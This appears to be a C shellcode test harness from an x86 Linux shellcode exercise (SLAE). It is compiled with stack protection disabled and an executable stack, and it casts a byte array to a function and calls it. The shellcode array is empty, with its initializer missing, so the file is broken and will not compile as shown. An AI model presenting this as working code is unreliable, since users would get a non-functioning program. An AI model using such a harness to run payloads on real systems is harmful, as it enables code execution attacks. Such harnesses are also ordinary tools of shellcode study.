/*

Architecture	: x86
OS		: Linux
Author		: wetw0rk
ID		: SLAE-958
Shellcode Size	: 75 bytes
Description	: 

Test using:
	gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \

int main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

